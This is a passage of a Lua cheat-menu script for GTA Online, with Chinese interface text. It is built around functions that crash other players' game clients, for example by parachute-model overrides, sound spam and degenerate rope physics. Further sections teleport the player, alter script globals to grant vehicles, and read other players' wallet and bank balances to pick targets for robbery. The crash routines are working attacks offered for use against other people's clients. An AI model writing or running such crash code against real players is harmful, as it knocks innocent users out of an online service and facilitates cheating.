        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           wait()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        wait(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    wait(500)
end

function personalcrashv4()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_mk_num_6")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               wait()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            wait(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            wait(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    
            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               wait()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            wait(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            wait(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end


function personalcrashv5()
    		for n = 0 , 5 do
    			PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    			object_hash = 1117917059
    			            		    	STREAMING.REQUEST_MODEL(object_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
    		       wait()
    	         end
    			PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    			wait(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			wait(1000)
    			menu.trigger_commands("tplsia")
    			bush_hash = -908104950
    			            		    	STREAMING.REQUEST_MODEL(bush_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
    		       wait()
    	         end
    		    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
               	wait(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    		    end
    			wait(1000)
    			menu.trigger_commands("tplsia")
    	end
end

    function soundcrash_all()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			wait()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			wait()
		end
         util.toast("声音垃圾邮件崩溃成功执行")
end

    function soundcrash_allV1()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local time = util.current_time_millis() + 100
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 8, 1 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z + 3, "GTAO_FM_Events_Soundset","MP_MISSION_COUNTDOWN_SOUNDSET", true, 100, false)
			end
			wait()
			for i = 1, 8, 1 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Checkpoint_Cash_Hit", TPPS.x,TPPS.y,TPPS.z + 3, "GTAO_FM_Events_Soundset","MP_MISSION_COUNTDOWN_SOUNDSET", true, 100, false)
			end
			wait()
			for i = 1, 8, 1 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", TPPS.x,TPPS.y,TPPS.z + 3, "GTAO_FM_Events_Soundset","MP_MISSION_COUNTDOWN_SOUNDSET", true, 100, false)
			end
			wait()
			for i = 1, 8, 1 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Start_Text", TPPS.x,TPPS.y,TPPS.z + 3, "GTAO_FM_Events_Soundset","MP_MISSION_COUNTDOWN_SOUNDSET", true, 100, false)
			end
			wait()
			for i = 1, 8, 1 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z + 3, "GTAO_FM_Events_Soundset","MP_MISSION_COUNTDOWN_SOUNDSET", true, 100, false)
			end
			wait()
		end
end

function jesus_help_me()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local SelfPlayerPed = entities.create_ped(2, util.joaat("u_m_m_jesus_01"), SelfPlayerPos, 0)
    for i = 1, 20 do                   
        ENTITY.SET_ENTITY_INVINCIBLE(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        wait(200)
        WIRI_VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_beach_parasol_05"))
        WIRI_VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        wait(200)
        entities.delete_by_handle(Ruiner2)
        entities.delete_by_handle(SelfPlayerPed)
    end
end

function rlengzhan()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
        STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           wait()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
        bush_hash = -908104950
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           wait()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           wait(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
    end
end

function numbercrash()
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
     local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)

     playpos.x = playpos.x + 10

     local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
     local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local pedc = CreatePed(26, 2597531625, playpos, 0)
     local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)

     local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
     PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
     wait(2500)
     PHYSICS.DELETE_CHILD_ROPE(ropec)
     entities.delete_by_handle(carc)
     entities.delete_by_handle(pedc)
end

function natural_crash_all()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
        wait(100)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            wait(25)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        local pos = players.get_position(user)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
        end
--董哥崩溃
function dgcrash()
    local user = players.user()
    local user_ped = players.user_ped()
    local setpackmodel = {}
    local obj_hash = {util.joaat("h4_prop_bush_mang_ad"),util.joaat("urbanweeds02_l1")}
    while true do
    crash_pos = players.get_position(user)
    PED.SET_PED_COMPONENT_VARIATION(user_ped,5,8,0,0)
    for mmtcrash = 1 , 1 do
        wait(500)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user_ped,crash_pos.x,crash_pos.y,crash_pos.z,false, false, false) 
        for Cra_ove , mmtcrash in pairs (obj_hash) do
            setpackmodel[Cra_ove] = PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user,mmtcrash)
            wait(0)
        end
        PED.SET_PED_COMPONENT_VARIATION(user_ped,-1087,-3012,13.94)
        wait(0)
    end
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user_ped,crash_pos.x,crash_pos.y,crash_pos.z,true, true, true)  
    end
end

function nothingcrash()
    local spped = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
    SelfPlayerPos.x = SelfPlayerPos.x + 10
    TTPos.x = TTPos.x + 10
    local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
    local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
    local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
    wait(3500)
    PHYSICS.DELETE_CHILD_ROPE(ropec)
	entities.delete_by_handle(pedc)
end

------------------------------------
-----------线上模式服务-------------
------------------------------------
function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local function CanSpawnNanoDrone()
	return BitTest(read_global.int(1962996), 23)
end

local function CanUseDrone()
	if not is_player_active(players.user(), true, true) then
		return false
	end
	if util.is_session_transition_active() then
		return false
	end
	if players.is_in_interior(players.user()) then
		return false
	end
	if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		return false
	end
	if PED.IS_PED_IN_ANY_TRAIN(players.user_ped()) or
	PLAYER.IS_PLAYER_RIDING_TRAIN(players.user()) then
		return false
	end
	if PED.IS_PED_FALLING(players.user_ped()) then
		return false
	end
	if ENTITY.GET_ENTITY_SUBMERGED_LEVEL(players.user_ped()) > 0.3 then
		return false
	end
	if ENTITY.IS_ENTITY_IN_AIR(players.user_ped()) then
		return false
	end
	if PED.IS_PED_ON_VEHICLE(players.user_ped()) then
		return false
	end
	return true
end
--即时纳米无人机
function nanodrone()
    local p_bits = memory.script_global(1962996)
	local bits = memory.read_int(p_bits)
	if CanUseDrone() and not BitTest(bits, 24) then
		TASK.CLEAR_PED_TASKS(players.user_ped())
		memory.write_int(p_bits, SetBit(bits, 24))
		if not CanSpawnNanoDrone() then memory.write_int(p_bits, SetBit(bits, 23)) end
	end
end
--请求豪华直升机
function luxuryhelicopter()
	if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
		write_global.int(2793044 + 888, 1)
		write_global.int(2793044 + 895, 1)
	end
end

function DoesPlayerOwnBandito(player)
	if player ~= -1 then
		local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 299)
		return BitTest(memory.read_int(address), 4)
	end
	return false
end

--即时RC匪徒
function bandito()
	write_global.int(2793044 + 6874, 1)
	if not DoesPlayerOwnBandito(players.user()) then
		local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 299)
		memory.write_int(address, SetBit(memory.read_int(address), 4))
	end
end

function DoesPlayerOwnMinitank(player)
	if player ~= -1 then
		local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 428 + 2)
		return BitTest(memory.read_int(address), 15)
	end
	return false
end

--即时遥控RC坦克
function rctank()
	write_global.int(2793044 + 6875, 1)
	if not DoesPlayerOwnMinitank(players.user()) then
		local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 428 + 2)
		memory.write_int(address, SetBit(memory.read_int(address), 15))
	end
end
------------------------------------
-----------线上模式传送-------------
------------------------------------
local SEC = ENTITY.SET_ENTITY_COORDS
local set = {alert = true}

local ownedprops = {
    {'事务所', 826},
    {'游戏厅', 740},
    {'改车铺', 779},
    {'地堡', 557},
    {'货物仓库', 473},
    {'CEO办公室',   475 },
    {'设施', 590},
    {'机库', 569},
    {'摩托帮会所', 492,
    mcprops = {'摩托帮产业', loc = {
        {'可卡因制造厂', 497 },
        {'假钞伪造厂。', 500 },
        {'证件伪造厂', 498 },
        {'冰毒实验室', 499 },
        {'大麻农场', 496 },
    }}},
    {'夜总会', 614},
    {'车辆仓库', 524}
}

local function getblip(id)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(id)
    while blip ~= 0 do
        local blipColour = HUD.GET_BLIP_COLOUR(blip)
        if HUD.DOES_BLIP_EXIST(blip) and blipColour != 55 and blipColour != 3 then return blip end
        blip = HUD.GET_NEXT_BLIP_INFO_ID(id)
    end
end

local function tpToBlip_teleport(blip)
    local pos = HUD.GET_BLIP_COORDS(blip)
    SEC(players.user_ped(), pos.x, pos.y, pos.z, false, false, false, false)
end

local properties = {}
local function regenerateTpLocations(root)
    for k, _ in pairs(properties) do
        menu.delete(properties[k])
        properties[k] = nil
    end
    for i = 1, #ownedprops do
        local propblip = getblip(ownedprops[i][2])
        if propblip == nil then break end

        properties[ownedprops[i][1]] = menu.action(root, ownedprops[i][1], {}, '', function()
            if not HUD.DOES_BLIP_EXIST(propblip) then
                util.toast('未找到资产')
                return
            end
            tpToBlip_teleport(propblip)
        end)
        if ownedprops[i].mcprops then
            local mcprops = ownedprops[i].mcprops
            local listName = mcprops[1]
            properties[listName] = menu.list(root, listName, {}, '')
            for j = 1, #mcprops.loc do players.user_ped()
                local mcproploc = getblip(mcprops.loc[j][2])
                if propblip == nil then break end

                menu.action(properties[listName], mcprops.loc[j][1], {}, '', function() 
                    if not HUD.DOES_BLIP_EXIST(propblip) then
                        util.toast('未找到资产')
                        return
                    end
                    tpToBlip_teleport(mcproploc)
                end)
            end
        end
    end
end

function tp_prop()
    regenerateTpLocations(Proptp)
end

function tp_aven()
    SEC(players.user_ped(), 514.31335, 4750.5264, -68.99592, false, false, false, false)
end

function tp_kosa()
    local kos = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    if kos.x ==0 and kos.y ==0 and kos.z ==0 then
        if set.alert then
            util.toast('未找到虎鲸') 
        end
    else    
        SEC(players.user_ped(), 1561.1543, 385.98312, -49.68535, false, false, false, false)
    end
end

function tp_moc()
    SEC(players.user_ped(), 1103.3782, -3011.6018, -38.999435, false, false, false, false)
end

function tp_terro()
    local ter = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    if ter.x == 0 and ter.y == 0 and ter.z == 0 then
        if set.alert then
            util.toast('未找到恐霸')
        end
    else    
        SEC(players.user_ped(), -1421.2347, -3012.9988, -79.04994, false, false, false, false)
    end
end

function tp_scargo()
    local cPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
        if cPickup.x == 0 and cPickup.y == 0 and cPickup.z == 0 then
            if set.alert then
                util.toast('未找到特殊货物')  
            end
        else
            SEC(players.user_ped(), cPickup.x, cPickup.y, cPickup.z, false, false, false, false)
        end
    end

function tp_vcargo()
    local vPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
        if vPickup.x == 0 and vPickup.y == 0 and vPickup.z == 0 then
            if set.alert then
                util.toast('未找到载具货物')
            end
        else
            SEC(players.user_ped(), vPickup.x, vPickup.y, vPickup.z, false, false, false, false)
        end
    end

function tp_desk()
    local pcD = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
        if pcD.x ~= 0 and pcD.y ~= 0 and pcD.z ~= 0 then
            SEC(players.user_ped(), pcD.x- 1.0, pcD.y + 1.0 , pcD.z, false, false, false, false)
        else
        if set.alert then
            util.toast('未找到电脑')  
        end
    end
end

function tp_NCperson()
    local nigh1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    local nigh2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
        if nigh1.x ~= 0 and nigh1.y ~= 0 and nigh1.z ~= 0 then
            SEC(players.user_ped(), nigh1.x, nigh1.y, nigh1.z, false, false, false, false)
        elseif nigh2.x ~= 0 and nigh2.y ~= 0 and nigh2.z ~= 0 then
            SEC(players.user_ped(), nigh2.x, nigh2.y, nigh2.z, false, false, false, false)
        else 
            if set.alert then
            util.toast('找不到目标')
            end
        end
    end

function tp_safe()
    local saf1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        local saf2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
            if saf1.x ~= 0 and saf1.y ~= 0 and saf1.z ~= 0 then
                SEC(players.user_ped(), saf1.x - 1.0, saf1.y + 1.0 , saf1.z, false, false, false, false)
            elseif saf2.x ~= 0 and saf2.y ~= 0 and saf2.z ~= 0 then
                SEC(players.user_ped(), saf2.x, saf2.y + 1.0 , saf2.z, false, false, false, false)
            else
                if set.alert then
                    util.toast('找不到保险柜')  
                end
            end
        end

function tp_mcproduct()
    local pPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
    local hPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
    local bPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if pPickup.x == 0 and pPickup.y == 0 and pPickup.z == 0 then

        elseif pPickup.x ~= 0 and pPickup.y ~= 0 and pPickup.z ~= 0 then
            SEC(players.user_ped(), pPickup.x - 1.5, pPickup.y , pPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到摩托帮货物')   
            end
            
        end
        if hPickup.x == 0 and hPickup.y == 0 and hPickup.z == 0 then

        elseif hPickup.x ~= 0 and hPickup.y ~= 0 and hPickup.z ~= 0 then
            SEC(players.user_ped(), hPickup.x- 1.5, hPickup.y, hPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到直升机')
            end
        end
        if bPickup.x == 0 and bPickup.y == 0 and bPickup.z == 0 then

        elseif bPickup.x ~= 0 and bPickup.y ~= 0 and bPickup.z ~= 0 then
            SEC(players.user_ped(), bPickup.x, bPickup.y, bPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                util.toast('传送到船')
            end
        end
        if plPickup.x == 0 and plPickup.y == 0 and plPickup.z == 0 then

        elseif plPickup.x ~= 0 and plPickup.y ~= 0 and plPickup.z ~= 0 then
            SEC(players.user_ped(), plPickup.x, plPickup.y + 1.5, plPickup.z - 1, false, false, false, false)
            if set.alert then
                util.toast('传送到飞机')
            end
        else                 
        if set.alert then
            util.toast('未找到摩托帮货物')
        end
    end
end

function tp_bsupplies()
    local sPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
    local dPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
    local fPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if sPickup.x == 0 and sPickup.y == 0 and sPickup.z == 0 then
        elseif sPickup.x ~= 0 and sPickup.y ~= 0 and sPickup.z ~= 0 then
            SEC(players.user_ped(), sPickup.x, sPickup.y + 2.0, sPickup.z - 1.0, false, false, false, false)
            if set.alert then
                util.toast('传送到补给品')
            end
        end
        if dPickup.x == 0 and dPickup.y == 0 and dPickup.z == 0 then
        elseif dPickup.x ~= 0 and dPickup.y ~= 0 and dPickup.z ~= 0 then
            SEC(players.user_ped(), dPickup.x, dPickup.y, dPickup.z, false, false, false, false)
            if set.alert then
                util.toast('传送到沙丘FAV')
            end
        end
        if fPickup.x == 0 and fPickup.y == 0 and fPickup.z == 0 then
        elseif fPickup.x ~= 0 and fPickup.y ~= 0 and fPickup.z ~= 0 then
            SEC(players.user_ped(), fPickup.x, fPickup.y, fPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                util.toast('传送到平板拖车')
            end
        else
             if set.alert then
                util.toast('未找到地堡补给品')
             end
        end
    end

function tp_payphone()
    local payPhon = GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_NEXT_BLIP_INFO_ID(817))
    GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_NEXT_BLIP_INFO_ID(817))
        if payPhon.x == 0 and payPhon.y == 0 and payPhon.z == 0 then
            if set.alert then
                util.toast('未找到公共电话亭')
            end
            else
                SEC(players.user_ped(), payPhon.x, payPhon.y, payPhon.z + 1, false, false, false, false)
        end
    end

function tp_eed()
    if GENERIC_HUD.DOES_BLIP_EXIST(GENERIC_HUD.GET_CLOSEST_BLIP_INFO_ID(780)) then
        local eDock = GENERIC_HUD.GET_BLIP_COORDS(GENERIC_HUD.GET_CLOSEST_BLIP_INFO_ID(780))
        if  eDock.x == 0 and eDock.y == 0 and eDock.z == 0
        then
         if set.alert then
         util.toast('未找到出口码头')
        end
         elseif eDock.x ~= 0 and eDock.y ~= 0 and eDock.z ~= 0 then
             PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), 1169.5736, -2971.932, 5.9021106)
         end
     end
end


------------------------------------
-----------线上模式宣布-------------
------------------------------------
function get_best_mug_target()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_wallet = players.get_wallet(p)
        if cur_wallet > most then
            most = cur_wallet
            mostp = p
        end
    end
    if cur_wallet == nil then
        util.toast("你孤单一人。找不到最佳抢劫目标。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 钱包里的钱最多($" .. most .. ")。 也许去抢劫他们。"
    else
        util.toast("找不到最佳抢劫目标。")
        return nil
    end
end

function get_poorest_player()
    local least = 10000000000000000
    local leastp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets < least then
            least = cur_assets
            leastp = p
        end
    end
    if cur_assets == nil then
        util.toast("你孤单一人。找不到最穷的玩家。")
        return
    end
    if least ~= 10000000000000000 then
        return PLAYER.GET_PLAYER_NAME(leastp) .. " 是本战局中最穷的玩家!(有$" .. players.get_wallet(leastp) .. " 在他们的钱包里$" .. players.get_bank(leastp) .. " 在银行里!)"
    else
        util.toast("找不到最穷的玩家。")
        return nil
    end
end

function get_richest_player()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(false, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets > most then
            most = cur_assets
            mostp = p
        end
    end
    if cur_assets == nil then
        util.toast("你孤单一人。找不到最富的玩家。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 是本战局中最富的玩家!(有$" .. players.get_wallet(mostp) .. " 在他们的钱包里$" .. players.get_bank(mostp) .. " 在银行里!)"
    else
        util.toast("找不到最富的玩家。")
        return nil
    end
end

function get_lapdances_amount(pid) 
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 55))
end
function get_prostitutes_solicited(pid)
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 54))
end

function get_horniest_player()
    local highest_horniness = 0
    local horniest = 0
    local most_lapdances = 0
    local most_prostitutes = 0
    for k,p in pairs(players.list(true, true, true)) do
        lapdances = get_lapdances_amount(p)
        prostitutes = get_prostitutes_solicited(p)
        horniness = lapdances + prostitutes
        if horniness > highest_horniness then
            highest_horniness = horniness
            horniest = p
            most_lapdances = lapdances
            most_prostitutes = prostitutes
        end
    end
    if horniness == nil then
        util.toast("你孤单一人。找不到最性奋的玩家。")
        return
    end
    if highest_horniness ~= 0 then
